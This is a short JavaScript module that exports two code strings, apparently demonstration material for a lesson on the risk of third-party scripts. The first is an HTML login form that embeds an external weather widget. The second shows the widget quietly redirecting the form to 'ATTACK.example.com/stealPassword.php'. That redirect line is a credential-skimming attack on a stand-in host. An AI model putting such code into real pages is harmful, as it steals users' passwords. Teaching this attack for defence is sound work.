const code = {
  loginCode:`
<div class="header"> Welcome!
  <div id="loginBox">Please Login:
    <form id ="loginForm" name="loginForm" action="login.php" method="post">
    Username: <input type="text" name="username" />
    <br/>
    Password: <input type="password" name="password" />
    <input type="submit" value="Login" />
    </form>
  </div>
  <div id="WeatherWidget">
  <script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"></script>
  </div>
</div>`,
 jsCode: `
 ...Weather widget code....
document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";`
}

export default code;
